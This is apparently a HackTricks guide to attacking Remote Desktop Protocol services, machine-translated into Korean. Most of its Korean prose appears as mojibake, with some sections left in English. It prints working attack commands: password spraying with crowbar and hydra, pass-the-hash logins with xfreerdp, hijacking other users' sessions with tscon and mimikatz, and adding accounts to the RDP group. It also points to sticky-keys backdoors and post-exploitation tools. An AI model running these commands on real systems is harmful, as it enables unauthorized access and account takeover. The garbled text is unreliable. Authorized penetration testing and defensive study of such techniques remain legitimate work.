# 3389 - RDP íœí…ŒìŠ¤íŒ…

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— ì œì¶œ**í•˜ì„¸ìš”.

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**ì·¨ì•½ì  í‰ê°€ ë° íœí…ŒìŠ¤íŒ…ì„ ìœ„í•œ ì¦‰ì‹œ ì‚¬ìš© ê°€ëŠ¥í•œ ì„¤ì •**. 20ê°œ ì´ìƒì˜ ë„êµ¬ ë° ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ ì–´ë””ì„œë“  ì „ì²´ íœí…ŒìŠ¤íŠ¸ë¥¼ ì‹¤í–‰í•˜ê³ , ë¦¬ì½˜ë¶€í„° ë³´ê³ ê¹Œì§€ ê°€ëŠ¥í•©ë‹ˆë‹¤. ìš°ë¦¬ëŠ” íœí…ŒìŠ¤í„°ë¥¼ ëŒ€ì²´í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤ - ëŒ€ì‹ , íœí…ŒìŠ¤í„°ê°€ ë” ê¹Šì´ íŒŒê³ ë“¤ê³ , ì‰˜ì„ ì—´ê³ , ì¬ë¯¸ë¥¼ ëŠë‚„ ìˆ˜ ìˆë„ë¡ ì‚¬ìš©ì ì •ì˜ ë„êµ¬, íƒì§€ ë° ê³µê²© ëª¨ë“ˆì„ ê°œë°œí•©ë‹ˆë‹¤.

{% embed url="https://pentest-tools.com/" %}

## ê¸°ë³¸ ì •ë³´

Microsoftì—ì„œ ê°œë°œëœ **ì›ê²© ë°ìŠ¤í¬í†± í”„ë¡œí† ì½œ** (**RDP**)ì€ ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•´ ì»´í“¨í„° ê°„ì— ê·¸ë˜í”½ ì¸í„°í˜ì´ìŠ¤ ì—°ê²°ì„ ê°€ëŠ¥í•˜ê²Œ í•˜ëŠ” ê²ƒì„ ëª©ì ìœ¼ë¡œ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì—°ê²°ì„ ì„¤ì •í•˜ê¸° ìœ„í•´ ì‚¬ìš©ìëŠ” **RDP** í´ë¼ì´ì–¸íŠ¸ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ì‚¬ìš©í•˜ë©°, ë™ì‹œì— ì›ê²© ì»´í“¨í„°ëŠ” **RDP** ì„œë²„ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ì‹¤í–‰í•´ì•¼ í•©ë‹ˆë‹¤. ì´ ì„¤ì •ì„ í†µí•´ ì›ê²© ì»´í“¨í„°ì˜ ë°ìŠ¤í¬í†± í™˜ê²½ì„ ì›í™œí•˜ê²Œ ì œì–´í•˜ê³  ì ‘ê·¼í•  ìˆ˜ ìˆìœ¼ë©°, ì‚¬ìš©ìì˜ ë¡œì»¬ ì¥ì¹˜ë¡œ ì¸í„°í˜ì´ìŠ¤ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸:** 3389
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
## ì—´ê±°

### ìë™

{% code overflow="wrap" %}
```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
{% endcode %}

ì‚¬ìš© ê°€ëŠ¥í•œ ì•”í˜¸í™” ë° DoS ì·¨ì•½ì ì„ í™•ì¸í•˜ê³  (ì„œë¹„ìŠ¤ì— DoSë¥¼ ë°œìƒì‹œí‚¤ì§€ ì•Šê³ ) NTLM Windows ì •ë³´ (ë²„ì „)ë¥¼ ì–»ìŠµë‹ˆë‹¤.

### [ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©](../generic-methodologies-and-resources/brute-force.md#rdp)

**ì£¼ì˜í•˜ì„¸ìš”, ê³„ì •ì´ ì ê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤**

### **ë¹„ë°€ë²ˆí˜¸ ìŠ¤í”„ë ˆì´**

**ì£¼ì˜í•˜ì„¸ìš”, ê³„ì •ì´ ì ê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤**
```bash
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### ì•Œë ¤ì§„ ìê²© ì¦ëª…/í•´ì‹œë¡œ ì—°ê²°í•˜ê¸°

If you have obtained known credentials or password hashes for an RDP (Remote Desktop Protocol) service, you can attempt to connect using them. This method can be useful if you have access to a compromised user account or have obtained credentials through other means.

To connect using known credentials, follow these steps:

1. Open your RDP client software (such as `xfreerdp`, `rdesktop`, or `mstsc`).
2. Enter the IP address or hostname of the target RDP server.
3. Provide the username and password or hash you have obtained.
4. Configure any additional settings, such as display resolution or audio redirection, if necessary.
5. Click on the "Connect" or "OK" button to initiate the connection.

If the provided credentials or hash are correct, you will be granted access to the remote desktop session. However, if the credentials are incorrect or the account has been disabled, you will not be able to establish a connection.

It is important to note that attempting to connect with unauthorized credentials or hashes is illegal and unethical. Always ensure you have proper authorization and permission before performing any penetration testing activities.
```bash
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
```
### ì•Œë ¤ì§„ ìê²© ì¦ëª…ì„ RDP ì„œë¹„ìŠ¤ì— ëŒ€í•´ í™•ì¸í•˜ê¸°

impacketì˜ rdp\_check.pyë¥¼ ì‚¬ìš©í•˜ë©´ RDP ì„œë¹„ìŠ¤ì— ëŒ€í•´ ì¼ë¶€ ìê²© ì¦ëª…ì´ ìœ íš¨í•œì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
rdp_check <domain>/<name>:<password>@<IP>
```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**ì·¨ì•½ì„± í‰ê°€ ë° ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•œ ì¦‰ì‹œ ì‚¬ìš© ê°€ëŠ¥í•œ ì„¤ì •**. 20ê°œ ì´ìƒì˜ ë„êµ¬ ë° ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ ë¦¬ì½˜ë¶€í„° ë³´ê³ ê¹Œì§€ ì „ì²´ íœí…ŒìŠ¤íŠ¸ë¥¼ ì–´ë””ì—ì„œë‚˜ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìš°ë¦¬ëŠ” íœí…ŒìŠ¤í„°ë¥¼ ëŒ€ì²´í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤ - ëŒ€ì‹ , íœí…ŒìŠ¤í„°ë“¤ì—ê²Œ ë” ê¹Šì´ íŒŒê³ ë“¤ê³ , ì‰˜ì„ ì—´ê³ , ì¬ë¯¸ë¥¼ ëŠë‚„ ìˆ˜ ìˆë„ë¡ ë§ì¶¤í˜• ë„êµ¬, íƒì§€ ë° ê³µê²© ëª¨ë“ˆì„ ê°œë°œí•©ë‹ˆë‹¤.

{% embed url="https://pentest-tools.com/" %}

## **ê³µê²©**

### ì„¸ì…˜ ë„ìš©

**SYSTEM ê¶Œí•œ**ìœ¼ë¡œ ì†Œìœ ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•Œ í•„ìš” ì—†ì´ **ì–´ë–¤ ì‚¬ìš©ìì˜ ì—´ë¦° RDP ì„¸ì…˜ì— ì ‘ê·¼**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì—´ë¦° ì„¸ì…˜ ê°€ì ¸ì˜¤ê¸°:**
```
query user
```
**ì„ íƒí•œ ì„¸ì…˜ì— ì•¡ì„¸ìŠ¤í•˜ê¸°**

To gain access to the selected session, follow these steps:

1. Identify the target system's IP address and ensure that it has the Remote Desktop Protocol (RDP) service enabled.
2. Use a port scanning tool to check if the RDP port (default: 3389) is open on the target system.
3. If the RDP port is open, attempt to establish a connection using an RDP client such as `xfreerdp` or `mstsc`.
4. Provide the necessary credentials (username and password) to authenticate and log in to the RDP session.
5. Once logged in, you will have access to the remote system's desktop and can interact with it as if you were physically present.

Note: It is important to obtain proper authorization before attempting to access any session or system that you do not own or have permission to access. Unauthorized access is illegal and unethical.
```bash
tscon <ID> /dest:<SESSIONNAME>
```
ì´ì œ ì„ íƒí•œ RDP ì„¸ì…˜ ë‚´ë¶€ì— ë“¤ì–´ê°€ì„œ Windows ë„êµ¬ì™€ ê¸°ëŠ¥ë§Œì„ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ìë¥¼ ìœ„ì¥í•´ì•¼ í•©ë‹ˆë‹¤.

**ì¤‘ìš”**: í™œì„±í™”ëœ RDP ì„¸ì…˜ì— ì•¡ì„¸ìŠ¤í•˜ë©´ ì‚¬ìš© ì¤‘ì¸ ì‚¬ìš©ìê°€ ë¡œê·¸ì•„ì›ƒë©ë‹ˆë‹¤.

í”„ë¡œì„¸ìŠ¤ ë¤í”„ë¥¼ í†µí•´ ì•”í˜¸ë¥¼ ì–»ì„ ìˆ˜ë„ ìˆì§€ë§Œ, ì´ ë°©ë²•ì€ í›¨ì”¬ ë¹ ë¥´ë©° ì‚¬ìš©ìì˜ ê°€ìƒ ë°ìŠ¤í¬í†±ê³¼ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ë””ìŠ¤í¬ì— ì €ì¥ë˜ì§€ ì•Šì€ ë©”ëª¨ì¥ì— ìˆëŠ” ì•”í˜¸, ë‹¤ë¥¸ ê¸°ê¸°ì—ì„œ ì—´ë¦° ë‹¤ë¥¸ RDP ì„¸ì…˜ ë“±).

#### **Mimikatz**

ì´ë¥¼ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ mimikatzë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
```
### Sticky-keys & Utilman

ì´ ê¸°ìˆ ì„ **stickykeys** ë˜ëŠ” **utilmanê³¼ ê²°í•©í•˜ë©´ ì–¸ì œë“ ì§€ ê´€ë¦¬ì CMD ë° RDP ì„¸ì…˜ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

ì´ë¯¸ ì´ëŸ¬í•œ ê¸°ìˆ  ì¤‘ í•˜ë‚˜ë¡œ ë°±ë„ì–´ê°€ ì„¤ì¹˜ëœ RDPë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://github.com/linuz/Sticky-Keys-Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

### RDP í”„ë¡œì„¸ìŠ¤ ì£¼ì…

ë‹¤ë¥¸ ë„ë©”ì¸ì—ì„œ ë˜ëŠ” **ë” ë†’ì€ ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìê°€ RDPë¥¼ í†µí•´** ê´€ë¦¬ìë¡œ ë¡œê·¸ì¸í•œ ê²½ìš°, **ê·¸ì˜ RDP ì„¸ì…˜ í”„ë¡œì„¸ìŠ¤ì— ë¹„ì½˜ì„ ì£¼ì…**í•˜ì—¬ ê·¸ì˜ ëŒ€ë¦¬ì¸ìœ¼ë¡œ í–‰ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md)
{% endcontent-ref %}

### RDP ê·¸ë£¹ì— ì‚¬ìš©ì ì¶”ê°€
```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```
## ìë™ ë„êµ¬

* [**AutoRDPwn**](https://github.com/JoelGMSec/AutoRDPwn)

**AutoRDPwn**ì€ ì£¼ë¡œ Microsoft Windows ì»´í“¨í„°ì—ì„œ **Shadow** ê³µê²©ì„ ìë™í™”í•˜ê¸° ìœ„í•´ Powershellë¡œ ì‘ì„±ëœ í¬ìŠ¤íŠ¸-ìµìŠ¤í”Œë¡œì‡ í”„ë ˆì„ì›Œí¬ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ (Microsoftì—ì„œ ê¸°ëŠ¥ìœ¼ë¡œ ë‚˜ì—´ëœ) ì›ê²© ê³µê²©ìê°€ í”¼í•´ìì˜ ë™ì˜ ì—†ì´ ê·¸ì˜ ë°ìŠ¤í¬í†±ì„ **ë³¼ ìˆ˜ ìˆê²Œ í•´ì£¼ë©°**, ìš´ì˜ ì²´ì œ ìì²´ì˜ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ í•„ìš”ì— ë”°ë¼ ì œì–´í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

* [**EvilRDP**](https://github.com/skelsec/evilrdp)
* ëª…ë ¹ ì¤„ì—ì„œ ìë™í™”ëœ ë°©ì‹ìœ¼ë¡œ ë§ˆìš°ìŠ¤ì™€ í‚¤ë³´ë“œë¥¼ ì œì–´í•©ë‹ˆë‹¤.
* ëª…ë ¹ ì¤„ì—ì„œ ìë™í™”ëœ ë°©ì‹ìœ¼ë¡œ í´ë¦½ë³´ë“œë¥¼ ì œì–´í•©ë‹ˆë‹¤.
* í´ë¼ì´ì–¸íŠ¸ì—ì„œ RDPë¥¼ í†µí•´ ëŒ€ìƒìœ¼ë¡œ ë„¤íŠ¸ì›Œí¬ í†µì‹ ì„ ì „ë‹¬í•˜ëŠ” SOCKS í”„ë¡ì‹œë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
* íŒŒì¼ ì „ì†¡ì´ ëŒ€ìƒì—ì„œ ë¹„í™œì„±í™”ë˜ì–´ ìˆì„ ë•Œë„ ëŒ€ìƒê³¼ íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ë‹¤ìš´ë¡œë“œí•©ë‹ˆë‹¤.
* íŒŒì¼ì„ ì—…ë¡œë“œí•˜ì§€ ì•Šê³  ëŒ€ìƒì—ì„œ ì„ì˜ì˜ SHELL ë° PowerShell ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.

## HackTricks ìë™ ëª…ë ¹ì–´
```
Protocol_Name: RDP    #Protocol Abbreviation if there is one.
Port_Number:  3389     #Comma separated if there is more than one.
Protocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for RDP
Note: |
Developed by Microsoft, the Remote Desktop Protocol (RDP) is designed to enable a graphical interface connection between computers over a network. To establish such a connection, RDP client software is utilized by the user, and concurrently, the remote computer is required to operate RDP server software. This setup allows for the seamless control and access of a distant computer's desktop environment, essentially bringing its interface to the user's local device.

https://book.hacktricks.xyz/pentesting/pentesting-rdp

Entry_2:
Name: Nmap
Description: Nmap with RDP Scripts
Command: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {IP}
```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**ì·¨ì•½ì„± í‰ê°€ ë° ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•œ ì¦‰ì‹œ ì‚¬ìš© ê°€ëŠ¥í•œ ì„¤ì •**. ë¦¬ì½˜ë¶€í„° ë³´ê³ ì„œ ì‘ì„±ê¹Œì§€ 20ê°œ ì´ìƒì˜ ë„êµ¬ì™€ ê¸°ëŠ¥ìœ¼ë¡œ ì–´ë””ì„œë“  ì „ì²´ íœí…ŒìŠ¤íŠ¸ë¥¼ ì‹¤í–‰í•˜ì„¸ìš”. ìš°ë¦¬ëŠ” íœí…ŒìŠ¤í„°ë¥¼ ëŒ€ì²´í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤ - ëŒ€ì‹ , íœí…ŒìŠ¤í„°ë“¤ì—ê²Œ ë” ê¹Šì´ íŒŒê³ ë“¤ê³ , ì‰˜ì„ íšë“í•˜ê³ , ì¬ë¯¸ë¥¼ ëŠë‚„ ìˆ˜ ìˆë„ë¡ ë§ì¶¤í˜• ë„êµ¬, íƒì§€ ë° ê³µê²© ëª¨ë“ˆì„ ê°œë°œí•©ë‹ˆë‹¤.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* HackTricksì—ì„œ **íšŒì‚¬ ê´‘ê³ ë¥¼ ë³´ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
